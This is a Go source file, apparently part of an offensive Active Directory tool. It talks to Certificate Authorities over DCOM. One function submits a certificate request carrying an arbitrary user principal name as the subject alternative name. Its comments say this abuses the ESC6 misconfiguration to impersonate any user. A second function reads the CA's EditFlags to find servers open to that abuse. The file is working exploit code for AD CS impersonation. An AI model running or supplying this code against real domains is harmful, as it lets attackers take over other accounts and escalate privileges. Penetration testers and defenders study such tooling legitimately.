// adcs_request_dcom.go handles DCOM connectivity for certificate operations:
// CSR submission via ICertRequestD and EditFlags query via ICertAdminD2.
// Core request logic and CSR building are in adcs_request.go.

package commands

import (
	"context"
	"fmt"
	"net"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	csra_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/csra/icertadmind2/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"
	wcce_client "github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/client"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce/icertrequestd/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	sspcred "github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom/wcce"

	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

// adcsSubmitCSR connects to the CA via DCOM and submits the CSR.
// Credentials are passed via dcerpc.WithCredentials() matching the go-msrpc config pattern.
func adcsSubmitCSR(ctx context.Context, server, caName, template, altName string, csrDER []byte, cred sspcred.Credential) (*icertrequestd.RequestResponse, error) {
	credOpt := dcerpc.WithCredentials(cred)

	// Step 1: Connect to EPM well-known endpoint (port 135) on the CA server
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
	if err != nil {
		return nil, fmt.Errorf("dial EPM on %s:135: %w", server, err)
	}
	defer cc.Close(ctx)

	// Step 2: ObjectExporter — ServerAlive2 to get COM version and bindings
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("object exporter client: %w", err)
	}

	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		return nil, fmt.Errorf("ServerAlive2: %w", err)
	}

	// Step 3: RemoteActivation — activate ICertRequestD via DCOM
	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("activation client: %w", err)
	}

	// ClassID for the certificate request COM class (CertRequestD).
	certServerClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e74-fc88-11d0-b498-00a0c90312f3"))

	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certServerClassID,
		IIDs:                       []*dcom.IID{icertrequestd.CertRequestDIID},
		RequestedProtocolSequences: []uint16{7, 15}, // ncacn_ip_tcp, ncacn_np
	})
	if err != nil {
		return nil, fmt.Errorf("RemoteActivation: %w", err)
	}
	if act.HResult != 0 {
		return nil, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	// Step 4: Dial the OXID endpoint for the activated object
	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
	if err != nil {
		return nil, fmt.Errorf("dial OXID endpoint: %w", err)
	}
	defer conn.Close(ctx)

	// Step 5: Create WCCE client — fresh security context, credentials via option
	ctx = gssapi.NewSecurityContext(ctx)
	wcceCli, err := wcce_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt)
	if err != nil {
		return nil, fmt.Errorf("WCCE client: %w", err)
	}
	wcceCli = wcceCli.IPID(ctx, act.InterfaceData[0].IPID())

	// Step 6: Build request attributes
	attrs := fmt.Sprintf("CertificateTemplate:%s\n", template)
	if altName != "" {
		// Also set SAN via attributes for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
		attrs += fmt.Sprintf("SAN:upn=%s\n", altName)
	}

	// Step 7: Submit the certificate request
	resp, err := wcceCli.CertRequestD().Request(ctx, &icertrequestd.RequestRequest{
		This:       &dcom.ORPCThis{Version: srv.COMVersion},
		Flags:      crInPKCS10,
		Authority:  caName,
		Attributes: attrs,
		Request: &wcce.CertTransportBlob{
			Length: uint32(len(csrDER)),
			Buffer: csrDER,
		},
	})
	if err != nil {
		return nil, fmt.Errorf("ICertRequestD::Request: %w", err)
	}

	return resp, nil
}

// EDITF_ATTRIBUTESUBJECTALTNAME2 — CA policy flag enabling ESC6.
// When set, the CA accepts SANs specified in request attributes, allowing
// any template to be used for impersonation regardless of template config.
const editfAttributeSubjectAltName2 = 0x00040000

// adcsQueryEditFlags connects to a CA via DCOM (ICertAdminD2) and retrieves
// the EditFlags from the policy module configuration. This is used to detect
// ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2).
func adcsQueryEditFlags(ctx context.Context, server, caName string, cred sspcred.Credential) (uint32, error) {
	credOpt := dcerpc.WithCredentials(cred)

	// Connect to EPM on port 135
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"))
	if err != nil {
		return 0, fmt.Errorf("dial EPM on %s:135: %w", server, err)
	}
	defer cc.Close(ctx)

	// ObjectExporter — ServerAlive2
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("object exporter client: %w", err)
	}
	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		return 0, fmt.Errorf("ServerAlive2: %w", err)
	}

	// RemoteActivation — activate CertAdminD class (d99e6e73) with ICertAdminD2 IID
	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("activation client: %w", err)
	}

	certAdminClassID := dtyp.GUIDFromUUID(uuid.MustParse("d99e6e73-fc88-11d0-b498-00a0c90312f3"))
	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis:                   &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:                    certAdminClassID,
		IIDs:                       []*dcom.IID{icertadmind2.CertAdminD2IID},
		RequestedProtocolSequences: []uint16{7, 15},
	})
	if err != nil {
		return 0, fmt.Errorf("RemoteActivation: %w", err)
	}
	if act.HResult != 0 {
		return 0, fmt.Errorf("RemoteActivation HRESULT: 0x%08x", uint32(act.HResult))
	}

	// Dial OXID endpoint
	conn, err := dcerpc.Dial(ctx, net.JoinHostPort(server, "135"),
		act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp")...)
	if err != nil {
		return 0, fmt.Errorf("dial OXID endpoint: %w", err)
	}
	defer conn.Close(ctx)

	// Create CSRA client (CertAdminD + CertAdminD2)
	ctx = gssapi.NewSecurityContext(ctx)
	csraCli, err := csra_client.NewClient(ctx, conn, dcerpc.WithSeal(), credOpt)
	if err != nil {
		return 0, fmt.Errorf("CSRA client: %w", err)
	}
	csraCli = csraCli.IPID(ctx, act.InterfaceData[0].IPID())

	// Query EditFlags via GetConfigEntry
	resp, err := csraCli.CertAdminD2().GetConfigEntry(ctx, &icertadmind2.GetConfigEntryRequest{
		This:      &dcom.ORPCThis{Version: srv.COMVersion},
		Authority: caName,
		NodePath:  `PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`,
		Entry:     "EditFlags",
	})
	if err != nil {
		return 0, fmt.Errorf("GetConfigEntry(EditFlags): %w", err)
	}

	// EditFlags is REG_DWORD → VT_I4 → VarUnion.Long
	if resp.Variant != nil && resp.Variant.VarUnion != nil {
		if val := resp.Variant.VarUnion.GetValue(); val != nil {
			switch v := val.(type) {
			case int32:
				return uint32(v), nil
			case uint32:
				return v, nil
			case int64:
				return uint32(v), nil
			}
		}
	}

	return 0, fmt.Errorf("unexpected variant type for EditFlags")
}
